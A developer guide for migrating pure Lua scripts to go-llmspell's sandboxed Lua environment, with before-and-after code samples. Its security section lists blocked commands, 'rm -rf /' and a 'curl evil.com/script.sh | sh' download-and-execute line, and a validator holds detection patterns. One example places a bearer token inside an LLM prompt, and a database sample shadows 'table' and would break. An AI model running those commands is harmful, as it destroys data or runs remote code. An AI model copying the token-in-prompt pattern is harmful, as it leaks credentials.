# Migration from Pure Lua

This guide helps developers migrate existing Lua scripts to go-llmspell's Lua environment, covering differences, adaptations needed, and best practices for migration.

## Table of Contents

- [Overview](#overview)
- [Key Differences](#key-differences)
- [Migration Strategy](#migration-strategy)
- [Module System Changes](#module-system-changes)
- [API Adaptations](#api-adaptations)
- [Async Programming Model](#async-programming-model)
- [Security Restrictions](#security-restrictions)
- [Testing Your Migration](#testing-your-migration)
- [Common Migration Patterns](#common-migration-patterns)
- [Troubleshooting Migration Issues](#troubleshooting-migration-issues)

## Overview

go-llmspell uses a sandboxed Lua 5.1 environment (via GopherLua) with custom modules for LLM operations. While it maintains Lua syntax compatibility, there are important differences in available libraries, security restrictions, and programming patterns.

### What You Can Keep

- ✅ Core Lua syntax and control structures
- ✅ Basic Lua standard library functions
- ✅ Table manipulation and metatables
- ✅ String operations and pattern matching
- ✅ Mathematical operations
- ✅ Coroutines (with enhanced async support)

### What Changes

- ❌ File I/O uses `tools` module instead of `io`
- ❌ No `os.execute` or `io.popen` (use tools instead)
- ❌ No `require` for external Lua modules
- ❌ Network operations through `tools.web_fetch`
- ❌ Different module system (pre-loaded modules)
- ✨ New LLM-specific modules and capabilities
- ✨ Built-in async/promise support
- ✨ Integrated state management

## Key Differences

### 1. Module System

**Pure Lua:**
```lua
-- Loading external modules
local json = require("cjson")
local http = require("socket.http")
local lfs = require("lfs")

-- Using package.path
package.path = package.path .. ";./lib/?.lua"
local mymodule = require("mymodule")
```

**go-llmspell:**
```lua
-- Pre-loaded modules (no require needed for these)
-- llm, tools, state, events are global

-- JSON operations
local data = require("data")
local json_str = data.to_json({key = "value"})
local obj = data.from_json(json_str)

-- HTTP operations
local response = tools.web_fetch("https://api.example.com")

-- File operations
local files = tools.list_files("./")
```

### 2. File Operations

**Pure Lua:**
```lua
-- Reading files
local file = io.open("data.txt", "r")
local content = file:read("*all")
file:close()

-- Writing files
local file = io.open("output.txt", "w")
file:write("Hello, world!")
file:close()

-- Directory operations (with lfs)
local lfs = require("lfs")
for file in lfs.dir("./") do
    print(file)
end
```

**go-llmspell:**
```lua
-- Reading files
local content = tools.file_read("data.txt")

-- Writing files
tools.file_write("output.txt", "Hello, world!")

-- Directory operations
local files = tools.list_files("./")
for _, file in ipairs(files) do
    print(file)
end

-- Check file existence
if tools.file_exists("data.txt") then
    -- Process file
end
```

### 3. HTTP Requests

**Pure Lua:**
```lua
local http = require("socket.http")
local response, status = http.request("https://api.example.com/data")

-- POST request
local response, status = http.request{
    url = "https://api.example.com/data",
    method = "POST",
    headers = {["Content-Type"] = "application/json"},
    source = ltn12.source.string('{"key": "value"}')
}
```

**go-llmspell:**
```lua
-- GET request
local response = tools.web_fetch("https://api.example.com/data")

-- For complex HTTP operations, use LLM agents
local agent = agent.create({
    name = "API Client",
    tools = {"web_fetch"},
    model = "gpt-3.5-turbo"
})

local result = agent:run("Make a POST request to the API with this data: " .. data.to_json(payload))
```

### 4. System Operations

**Pure Lua:**
```lua
-- Execute system commands
local handle = io.popen("ls -la")
local result = handle:read("*all")
handle:close()

-- Environment variables
local home = os.getenv("HOME")

-- Date/time
local now = os.time()
local formatted = os.date("%Y-%m-%d %H:%M:%S", now)
```

**go-llmspell:**
```lua
-- No direct system command execution (security)
-- Use tools for specific operations

-- Environment variables (limited access)
local api_key = os.getenv("OPENAI_API_KEY")

-- Date/time operations
local now = tools.datetime_now()
local formatted = tools.datetime_format(now, "YYYY-MM-DD HH:mm:ss")

-- For system operations, use agents
local result = agent:run("List all markdown files in the current directory")
```

## Migration Strategy

### Step 1: Inventory Your Dependencies

Create a list of all external dependencies and map them to go-llmspell equivalents:

```lua
-- migration_map.lua
local migration_map = {
    -- File operations
    ["io.open"] = "tools.file_read/write",
    ["lfs"] = "tools.list_files, tools.file_exists",
    
    -- Network
    ["socket.http"] = "tools.web_fetch",
    ["curl"] = "tools.web_fetch",
    
    -- JSON
    ["cjson"] = "data.to_json/from_json",
    ["dkjson"] = "data.to_json/from_json",
    
    -- System
    ["os.execute"] = "Use agent with appropriate tools",
    ["io.popen"] = "Use agent with appropriate tools"
}
```

### Step 2: Refactor I/O Operations

**Before:**
```lua
local function read_config()
    local file = io.open("config.json", "r")
    if not file then
        error("Config file not found")
    end
    
    local content = file:read("*all")
    file:close()
    
    local cjson = require("cjson")
    return cjson.decode(content)
end
```

**After:**
```lua
local function read_config()
    if not tools.file_exists("config.json") then
        error("Config file not found")
    end
    
    local content = tools.file_read("config.json")
    return data.from_json(content)
end
```

### Step 3: Replace System Calls

**Before:**
```lua
local function process_files()
    -- Get list of files
    local handle = io.popen("find . -name '*.txt'")
    local files = handle:read("*all")
    handle:close()
    
    -- Process each file
    for file in files:gmatch("[^\n]+") do
        local cmd = "wc -l " .. file
        local handle = io.popen(cmd)
        local count = handle:read("*all")
        handle:close()
        print(file .. ": " .. count)
    end
end
```

**After:**
```lua
local function process_files()
    -- Get list of files
    local files = tools.find_files(".", "*.txt")
    
    -- Process each file
    for _, file in ipairs(files) do
        local content = tools.file_read(file)
        local line_count = 0
        for _ in content:gmatch("[^\n]+") do
            line_count = line_count + 1
        end
        print(file .. ": " .. line_count .. " lines")
    end
end
```

### Step 4: Adapt Network Operations

**Before:**
```lua
local http = require("socket.http")
local json = require("cjson")

local function fetch_api_data(endpoint)
    local response, status, headers = http.request{
        url = "https://api.example.com/" .. endpoint,
        headers = {
            ["Authorization"] = "Bearer " .. API_TOKEN,
            ["Content-Type"] = "application/json"
        }
    }
    
    if status ~= 200 then
        error("API request failed: " .. status)
    end
    
    return json.decode(response)
end
```

**After:**
```lua
local function fetch_api_data(endpoint)
    -- Note: Headers are handled differently
    -- For complex HTTP requests, consider using an agent
    
    local agent = agent.create({
        name = "API Client",
        model = "gpt-3.5-turbo",
        tools = {"web_fetch"}
    })
    
    local prompt = string.format(
        "Fetch data from https://api.example.com/%s with Authorization: Bearer %s",
        endpoint, 
        os.getenv("API_TOKEN")
    )
    
    local response = agent:run(prompt)
    return data.from_json(response)
end

-- Or for simple GET requests
local function fetch_simple_data(url)
    local response = tools.web_fetch(url)
    return data.from_json(response)
end
```

## Module System Changes

### Creating Modules in go-llmspell

While you can't `require` external files, you can create module-like structures:

```lua
-- mymodule.lua content (embedded in main spell)
local MyModule = {}

MyModule.version = "1.0.0"

function MyModule.process(data)
    -- Module functionality
    return processed_data
end

-- Instead of module() or return MyModule
-- Assign to a global or return from a function

-- Option 1: Global assignment (be careful with naming)
_G.MyModule = MyModule

-- Option 2: Local module pattern
local function create_module()
    local M = {}
    
    function M.method1() end
    function M.method2() end
    
    return M
end

local mymodule = create_module()
```

### Handling Module Dependencies

**Pure Lua approach:**
```lua
-- main.lua
local utils = require("lib.utils")
local config = require("config")
local processor = require("processors.data_processor")

function main()
    local data = utils.load_data(config.data_path)
    return processor.process(data)
end
```

**go-llmspell approach:**
```lua
-- Inline all modules in your spell or use multiple spells

-- utils.lua content
local Utils = {}
function Utils.load_data(path)
    return data.from_json(tools.file_read(path))
end

-- config.lua content  
local Config = {
    data_path = params.data_path or "./data.json"
}

-- processor.lua content
local Processor = {}
function Processor.process(data)
    -- Processing logic
    return data
end

-- main logic
local function main()
    local data = Utils.load_data(Config.data_path)
    return Processor.process(data)
end

return main()
```

## API Adaptations

### Adapting Database Operations

**Pure Lua with luasql:**
```lua
local luasql = require("luasql.sqlite3")

local env = luasql.sqlite3()
local conn = env:connect("database.db")

local cursor = conn:execute("SELECT * FROM users")
local row = cursor:fetch({}, "a")
while row do
    print(row.name, row.email)
    row = cursor:fetch(row, "a")
end

cursor:close()
conn:close()
env:close()
```

**go-llmspell approach:**
```lua
-- Use state management for data persistence
local db = state.create("database", {persistent = true})

-- Simulate table with nested state
function create_table(db, table_name)
    if not db:get(table_name) then
        db:set(table_name, {})
    end
end

function insert_record(db, table_name, record)
    local table = db:get(table_name) or {}
    table[#table + 1] = record
    db:set(table_name, table)
end

function select_all(db, table_name)
    return db:get(table_name) or {}
end

-- Usage
create_table(db, "users")
insert_record(db, "users", {name = "Alice", email = "alice@example.com"})
insert_record(db, "users", {name = "Bob", email = "bob@example.com"})

local users = select_all(db, "users")
for _, user in ipairs(users) do
    print(user.name, user.email)
end

db:save()  -- Persist to disk
```

### Adapting Redis/Cache Operations

**Pure Lua with redis-lua:**
```lua
local redis = require("redis")
local client = redis.connect("127.0.0.1", 6379)

client:set("key", "value")
local value = client:get("key")

client:expire("key", 3600)
```

**go-llmspell approach:**
```lua
-- Use state with TTL simulation
local Cache = {}

function Cache:new()
    local obj = {
        store = state.create("cache"),
        ttls = {}
    }
    setmetatable(obj, {__index = self})
    return obj
end

function Cache:set(key, value, ttl)
    self.store:set(key, value)
    if ttl then
        self.ttls[key] = os.time() + ttl
    end
end

function Cache:get(key)
    -- Check TTL
    if self.ttls[key] and os.time() > self.ttls[key] then
        self.store:set(key, nil)
        self.ttls[key] = nil
        return nil
    end
    
    return self.store:get(key)
end

-- Usage
local cache = Cache:new()
cache:set("key", "value", 3600)  -- 1 hour TTL
local value = cache:get("key")
```

## Async Programming Model

### Converting Callback-Based Code

**Pure Lua with callbacks:**
```lua
local function fetch_data(url, callback)
    -- Simulate async operation
    timer.setTimeout(function()
        local data = http.get(url)
        callback(nil, data)
    end, 1000)
end

fetch_data("https://api.example.com", function(err, data)
    if err then
        print("Error: " .. err)
    else
        print("Data: " .. data)
    end
end)
```

**go-llmspell with promises:**
```lua
local function fetch_data(url)
    return promise.new(function(resolve, reject)
        core.async(function()
            local success, data = pcall(tools.web_fetch, url)
            if success then
                resolve(data)
            else
                reject(data)
            end
        end)
    end)
end

-- Usage with async/await pattern
fetch_data("https://api.example.com")
    :next(function(data)
        print("Data: " .. data)
    end)
    :catch(function(err)
        print("Error: " .. err)
    end)

-- Or with await
local data = fetch_data("https://api.example.com"):await()
```

### Converting Event-Based Code

**Pure Lua with events:**
```lua
local EventEmitter = require("events").EventEmitter

local emitter = EventEmitter:new()

emitter:on("data", function(data)
    print("Received:", data)
end)

emitter:emit("data", "Hello, World!")
```

**go-llmspell approach:**
```lua
-- Built-in event system
events.on("data", function(data)
    print("Received:", data)
end)

events.emit("data", "Hello, World!")

-- Or create custom event emitter
local function create_emitter()
    local handlers = {}
    
    return {
        on = function(event, handler)
            handlers[event] = handlers[event] or {}
            table.insert(handlers[event], handler)
        end,
        
        emit = function(event, ...)
            local event_handlers = handlers[event] or {}
            for _, handler in ipairs(event_handlers) do
                handler(...)
            end
        end
    }
end
```

## Security Restrictions

### Working Within Sandbox Limits

**What's Blocked:**
```lua
-- These will fail in go-llmspell
os.execute("rm -rf /")  -- Blocked
io.popen("curl evil.com/script.sh | sh")  -- Blocked
load(untrusted_code)()  -- Restricted
debug.getupvalue()  -- Limited/blocked
require("os").execute()  -- Can't require os
```

**Safe Alternatives:**
```lua
-- Use agents for system operations
local file_agent = agent.create({
    name = "File Manager",
    tools = {"file_delete", "file_list"},
    model = "gpt-3.5-turbo"
})

file_agent:run("Delete all .tmp files in the current directory")

-- Use built-in functions for code execution
local safe_code = [[
    return function(x)
        return x * 2
    end
]]

local fn = loadstring(safe_code)()  -- If loadstring is available
-- Or embed functions directly
```

### Handling Restricted Operations

```lua
-- Create a compatibility layer
local compat = {}

function compat.execute_command(cmd)
    -- Map common commands to agent operations
    local command_map = {
        ["ls"] = "List files in current directory",
        ["cat (.+)"] = "Read file: %1",
        ["mkdir (.+)"] = "Create directory: %1",
        ["rm (.+)"] = "Delete file: %1"
    }
    
    for pattern, agent_prompt in pairs(command_map) do
        local capture = cmd:match(pattern)
        if capture then
            local prompt = agent_prompt:gsub("%%1", capture)
            return file_agent:run(prompt)
        end
    end
    
    error("Command not supported in sandbox: " .. cmd)
end

-- Usage
local result = compat.execute_command("ls")
```

## Testing Your Migration

### Create Test Harness

```lua
-- test_migration.lua
local TestRunner = {}

function TestRunner:new()
    local obj = {
        tests = {},
        results = {passed = 0, failed = 0}
    }
    setmetatable(obj, {__index = self})
    return obj
end

function TestRunner:test(name, fn)
    table.insert(self.tests, {name = name, fn = fn})
end

function TestRunner:run()
    for _, test in ipairs(self.tests) do
        local success, err = pcall(test.fn)
        if success then
            self.results.passed = self.results.passed + 1
            print("✓ " .. test.name)
        else
            self.results.failed = self.results.failed + 1
            print("✗ " .. test.name .. ": " .. tostring(err))
        end
    end
    
    print(string.format("\nTests: %d passed, %d failed", 
        self.results.passed, self.results.failed))
end

-- Create test runner
local runner = TestRunner:new()

-- Test file operations
runner:test("File read/write", function()
    local test_content = "Hello, go-llmspell!"
    tools.file_write("test.txt", test_content)
    local read_content = tools.file_read("test.txt")
    assert(read_content == test_content, "File content mismatch")
    tools.file_delete("test.txt")
end)

-- Test JSON operations
runner:test("JSON serialization", function()
    local obj = {name = "test", value = 123, nested = {a = 1}}
    local json_str = data.to_json(obj)
    local decoded = data.from_json(json_str)
    assert(decoded.name == obj.name, "JSON decode failed")
    assert(decoded.nested.a == obj.nested.a, "Nested JSON decode failed")
end)

-- Test async operations
runner:test("Promise operations", function()
    local p = promise.new(function(resolve)
        core.async(function()
            core.sleep(0.1)
            resolve("async result")
        end)
    end)
    
    local result = p:await()
    assert(result == "async result", "Promise didn't resolve correctly")
end)

-- Run tests
runner:run()
```

### Migration Validation Checklist

```lua
-- migration_validator.lua
local MigrationValidator = {}

function MigrationValidator:validate(old_script_path)
    local issues = {}
    
    -- Read the old script
    local content = tools.file_read(old_script_path)
    
    -- Check for blocked operations
    local blocked_patterns = {
        {pattern = "os%.execute", message = "os.execute is blocked, use agents"},
        {pattern = "io%.popen", message = "io.popen is blocked, use tools"},
        {pattern = "require%s*%(%s*[\"']os[\"']", message = "os module not available"},
        {pattern = "require%s*%(%s*[\"']io[\"']", message = "Use tools for file I/O"},
        {pattern = "package%.loadlib", message = "Cannot load C libraries"},
        {pattern = "debug%.", message = "Debug library is restricted"}
    }
    
    for _, check in ipairs(blocked_patterns) do
        if content:find(check.pattern) then
            table.insert(issues, check.message)
        end
    end
    
    -- Check for required adaptations
    local adaptation_patterns = {
        {pattern = "io%.open", suggestion = "Use tools.file_read/write"},
        {pattern = "http%.request", suggestion = "Use tools.web_fetch"},
        {pattern = "json%.encode", suggestion = "Use data.to_json"},
        {pattern = "lfs%.dir", suggestion = "Use tools.list_files"}
    }
    
    for _, check in ipairs(adaptation_patterns) do
        if content:find(check.pattern) then
            table.insert(issues, "Adapt: " .. check.suggestion)
        end
    end
    
    return issues
end

-- Usage
local validator = MigrationValidator
local issues = validator:validate("old_script.lua")

if #issues > 0 then
    print("Migration issues found:")
    for _, issue in ipairs(issues) do
        print("  - " .. issue)
    end
else
    print("No migration issues detected!")
end
```

## Common Migration Patterns

### Pattern: Configuration Files

**Pure Lua:**
```lua
-- config.lua
return {
    database = {
        host = "localhost",
        port = 5432,
        name = "myapp"
    },
    api = {
        key = os.getenv("API_KEY"),
        endpoint = "https://api.example.com"
    }
}

-- main.lua
local config = require("config")
```

**go-llmspell:**
```lua
-- Option 1: Embed configuration
local config = {
    database = {
        host = params.db_host or "localhost",
        port = tonumber(params.db_port) or 5432,
        name = params.db_name or "myapp"
    },
    api = {
        key = os.getenv("API_KEY"),
        endpoint = params.api_endpoint or "https://api.example.com"
    }
}

-- Option 2: Read from JSON file
local config = data.from_json(tools.file_read("config.json"))

-- Option 3: Use state for dynamic config
local config_state = state.create("config", {persistent = true})
if not config_state:get("initialized") then
    config_state:set("database", {host = "localhost", port = 5432})
    config_state:set("api", {key = os.getenv("API_KEY")})
    config_state:set("initialized", true)
    config_state:save()
end
```

### Pattern: Logging Systems

**Pure Lua:**
```lua
local logger = require("logger")

logger.setLevel("DEBUG")
logger.debug("Debug message")
logger.info("Info message")
logger.error("Error message")

-- Custom file logging
local log_file = io.open("app.log", "a")
logger.addHandler(function(level, msg)
    log_file:write(os.date() .. " [" .. level .. "] " .. msg .. "\n")
    log_file:flush()
end)
```

**go-llmspell:**
```lua
-- Built-in logging
log.set_level("debug")
log.debug("Debug message")
log.info("Info message")
log.error("Error message")

-- Custom file logging
local function create_file_logger(filename)
    local logger = {}
    
    function logger.write(level, message, context)
        local entry = {
            timestamp = os.date(),
            level = level,
            message = message,
            context = context or {}
        }
        
        -- Append to file
        local existing = ""
        if tools.file_exists(filename) then
            existing = tools.file_read(filename)
        end
        
        tools.file_write(filename, 
            existing .. data.to_json(entry) .. "\n"
        )
    end
    
    return logger
end

local file_logger = create_file_logger("app.log")
file_logger.write("INFO", "Application started")
```

### Pattern: Background Tasks

**Pure Lua with copas:**
```lua
local copas = require("copas")

copas.addthread(function()
    while true do
        -- Background task
        process_queue()
        copas.sleep(5)
    end
end)

copas.loop()
```

**go-llmspell:**
```lua
-- Background task with async
core.async(function()
    while true do
        -- Background task
        process_queue()
        core.sleep(5)
    end
end)

-- Or with promises for more control
local function background_worker()
    return promise.new(function(resolve, reject)
        core.async(function()
            local should_continue = true
            
            while should_continue do
                local success, err = pcall(process_queue)
                if not success then
                    log.error("Background task error", {error = err})
                end
                
                -- Check if we should stop
                if state.get("stop_workers") then
                    should_continue = false
                end
                
                core.sleep(5)
            end
            
            resolve("Worker stopped")
        end)
    end)
end

-- Start multiple workers
local workers = {}
for i = 1, 3 do
    workers[i] = background_worker()
end

-- Stop all workers
state.set("stop_workers", true)
promise.all(workers):await()
```

## Troubleshooting Migration Issues

### Issue: Missing Library Functions

```lua
-- Create compatibility shims
local compat = {}

-- String functions that might be missing
function compat.string_split(str, delimiter)
    delimiter = delimiter or "%s"
    local parts = {}
    for part in string.gmatch(str, "([^" .. delimiter .. "]+)") do
        table.insert(parts, part)
    end
    return parts
end

-- Table functions
function compat.table_keys(t)
    local keys = {}
    for k in pairs(t) do
        table.insert(keys, k)
    end
    return keys
end

function compat.table_values(t)
    local values = {}
    for _, v in pairs(t) do
        table.insert(values, v)
    end
    return values
end

-- Make available globally or in module
string.split = compat.string_split
table.keys = compat.table_keys
table.values = compat.table_values
```

### Issue: Complex Module Dependencies

```lua
-- Strategy: Bundle modules into single file
local bundler = {}

function bundler.bundle_modules(module_files, output_file)
    local bundle = [[
-- Auto-generated bundle
local modules = {}
]]
    
    for _, module_file in ipairs(module_files) do
        local content = tools.file_read(module_file)
        local module_name = module_file:match("([^/]+)%.lua$")
        
        bundle = bundle .. string.format([[
modules["%s"] = function()
%s
end

]], module_name, content)
    end
    
    bundle = bundle .. [[
-- Module loader
local function require(name)
    if modules[name] then
        return modules[name]()
    else
        error("Module not found: " .. name)
    end
end

-- Main script starts here
]]
    
    tools.file_write(output_file, bundle)
end

-- Usage
bundler.bundle_modules({
    "utils.lua",
    "config.lua", 
    "processor.lua"
}, "bundled_spell.lua")
```

### Issue: Database Migration

```lua
-- Simple database abstraction
local DB = {}

function DB:new(name)
    local obj = {
        state = state.create("db_" .. name, {persistent = true}),
        name = name
    }
    setmetatable(obj, {__index = self})
    
    -- Initialize if needed
    if not obj.state:get("_tables") then
        obj.state:set("_tables", {})
    end
    
    return obj
end

function DB:create_table(table_name, schema)
    local tables = self.state:get("_tables")
    tables[table_name] = {
        schema = schema,
        records = {},
        next_id = 1
    }
    self.state:set("_tables", tables)
end

function DB:insert(table_name, record)
    local tables = self.state:get("_tables")
    local table = tables[table_name]
    
    if not table then
        error("Table not found: " .. table_name)
    end
    
    record.id = table.next_id
    table.next_id = table.next_id + 1
    table.records[record.id] = record
    
    self.state:set("_tables", tables)
    return record.id
end

function DB:select(table_name, where_fn)
    local tables = self.state:get("_tables")
    local table = tables[table_name]
    
    if not table then
        error("Table not found: " .. table_name)
    end
    
    local results = {}
    for _, record in pairs(table.records) do
        if not where_fn or where_fn(record) then
            table.insert(results, record)
        end
    end
    
    return results
end

-- Usage
local db = DB:new("myapp")

db:create_table("users", {
    id = "number",
    name = "string",
    email = "string"
})

db:insert("users", {name = "Alice", email = "alice@example.com"})
db:insert("users", {name = "Bob", email = "bob@example.com"})

local users = db:select("users", function(user)
    return user.name:match("^A")
end)
```

## Best Practices for Migrated Code

1. **Use Parameter Validation**
   ```lua
   -- Add at the start of migrated scripts
   local function validate_environment()
       assert(llm, "LLM module not available")
       assert(tools, "Tools module not available")
       assert(params, "Parameters not provided")
   end
   validate_environment()
   ```

2. **Create Compatibility Layer**
   ```lua
   -- compat.lua - Include in migrated scripts
   local compat = {}
   
   -- Provide missing functions
   compat.io = {
       read = tools.file_read,
       write = tools.file_write
   }
   
   -- Simulate missing modules
   compat.modules = {
       json = {
           encode = data.to_json,
           decode = data.from_json
       }
   }
   
   return compat
   ```

3. **Document Changes**
   ```lua
   --[[
   Migration Notes:
   - Replaced io.open with tools.file_read/write
   - HTTP requests now use tools.web_fetch
   - Database operations use state management
   - Background tasks use core.async
   
   Original version: github.com/user/repo/original.lua
   Migration date: 2024-01-15
   ]]
   ```

4. **Test Incrementally**
   ```lua
   -- Test each component after migration
   local function test_component(name, test_fn)
       print("Testing: " .. name)
       local success, err = pcall(test_fn)
       if success then
           print("  ✓ Passed")
       else
           print("  ✗ Failed: " .. tostring(err))
       end
   end
   
   test_component("File operations", test_file_ops)
   test_component("Network operations", test_network_ops)
   test_component("Data processing", test_data_processing)
   ```

Remember: Migration is an iterative process. Start with core functionality, test thoroughly, and gradually add features. The go-llmspell environment provides powerful LLM capabilities that can often simplify complex operations from pure Lua.